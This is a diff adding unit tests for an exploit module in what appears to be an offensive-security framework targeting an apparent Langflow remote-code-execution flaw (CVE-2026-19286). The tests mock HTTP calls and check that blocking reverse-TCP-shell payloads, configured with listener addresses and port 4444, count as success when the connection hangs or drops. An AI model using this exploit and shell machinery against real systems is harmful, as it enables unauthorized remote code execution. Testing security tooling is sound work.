@@ -2,7 +2,13 @@
 
 from unittest.mock import MagicMock, patch
 
-from flowhound.vulnerabilities.exploits.cve_2026_19286 import Exploit
+from requests import ReadTimeout
+from requests.exceptions import ConnectionError as RequestsConnectionError
+
+from flowhound.vulnerabilities.exploits.cve_2026_19286 import (
+    _BLOCKING_SENTINEL,
+    Exploit,
+)
 
 _BASE_URL = "http://localhost:7860"
 _AUTH_HEADERS = {
@@ -179,6 +185,69 @@ class TestTriggerVuln:
                 is None
             )
 
+    def test_blocking_read_timeout_returns_sentinel(self):
+        exploit = Exploit()
+        with patch(
+            "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
+            side_effect=ReadTimeout(),
+        ):
+            assert (
+                exploit.trigger_vuln(
+                    base_url=_BASE_URL,
+                    flow_id="flow-1",
+                    command="shell",
+                    blocking=True,
+                )
+                == _BLOCKING_SENTINEL
+            )
+
+    def test_blocking_remote_disconnected_returns_sentinel(self):
+        exploit = Exploit()
+        with patch(
+            "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
+            side_effect=RequestsConnectionError("Remote end closed connection"),
+        ):
+            assert (
+                exploit.trigger_vuln(
+                    base_url=_BASE_URL,
+                    flow_id="flow-1",
+                    command="shell",
+                    blocking=True,
+                )
+                == _BLOCKING_SENTINEL
+            )
+
+    def test_non_blocking_connection_error_returns_none(self):
+        exploit = Exploit()
+        with patch(
+            "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
+            side_effect=RequestsConnectionError("refused"),
+        ):
+            assert (
+                exploit.trigger_vuln(
+                    base_url=_BASE_URL,
+                    flow_id="flow-1",
+                    command="id",
+                    blocking=False,
+                )
+                is None
+            )
+
+    def test_blocking_uses_short_read_timeout(self):
+        exploit = Exploit()
+        with patch(
+            "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
+            side_effect=ReadTimeout(),
+        ) as mock_post:
+            exploit.trigger_vuln(
+                base_url=_BASE_URL, flow_id="flow-1", command="shell", blocking=True
+            )
+        timeout_arg = mock_post.call_args.kwargs["timeout"]
+        assert isinstance(timeout_arg, tuple)
+        connect_t, read_t = timeout_arg
+        assert connect_t == exploit.TIMEOUT
+        assert read_t == 1
+
 
 # ---------------------------------------------------------------------------
 # delete_flow
@@ -271,6 +340,75 @@ class TestExploit:
                 exploit.exploit(base_url=_BASE_URL, username="admin", password="secret")
                 is True
             )
+
+    def test_blocking_payload_returns_true(self):
+        """A blocking payload (reverse shell) fires and returns True on ReadTimeout."""
+        from flowhound.vulnerabilities.payloads.reverse_tcp_shell import Payload
+
+        exploit = Exploit()
+        with (
+            patch(
+                "flowhound.vulnerabilities.clients.langflow.post",
+                return_value=_mock_auth_post(),
+            ),
+            patch(
+                "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
+                side_effect=[
+                    _mock_resp(201, {"id": "flow-1"}),  # create_flow
+                    ReadTimeout(),  # trigger_vuln — shell fired
+                ],
+            ),
+            patch(
+                "flowhound.vulnerabilities.exploits.cve_2026_19286.delete",
+                return_value=_mock_resp(200),
+            ) as mock_delete,
+        ):
+            shell_payload = Payload(lhost="192.168.1.5", lport=4444)
+            assert (
+                exploit.exploit(
+                    base_url=_BASE_URL,
+                    username="admin",
+                    password="secret",
+                    payload=shell_payload,
+                )
+                is True
+            )
+        # delete_flow must NOT be called — the worker process was replaced by the shell
+        mock_delete.assert_not_called()
+
+    def test_blocking_payload_remote_disconnected_returns_true(self):
+        """RemoteDisconnected on a blocking payload is also treated as success."""
+        from flowhound.vulnerabilities.payloads.reverse_tcp_shell import Payload
+
+        exploit = Exploit()
+        with (
+            patch(
+                "flowhound.vulnerabilities.clients.langflow.post",
+                return_value=_mock_auth_post(),
+            ),
+            patch(
+                "flowhound.vulnerabilities.exploits.cve_2026_19286.post",
+                side_effect=[
+                    _mock_resp(201, {"id": "flow-1"}),
+                    RequestsConnectionError("Remote end closed connection"),
+                ],
+            ),
+            patch(
+                "flowhound.vulnerabilities.exploits.cve_2026_19286.delete",
+                return_value=_mock_resp(200),
+            ) as mock_delete,
+        ):
+            shell_payload = Payload(lhost="9.61.10.227", lport=4444)
+            assert (
+                exploit.exploit(
+                    base_url=_BASE_URL,
+                    username="admin",
+                    password="secret",
+                    payload=shell_payload,
+                )
+                is True
+            )
+        mock_delete.assert_not_called()
 
     def test_no_rce_output_returns_false(self):
         exploit = Exploit()
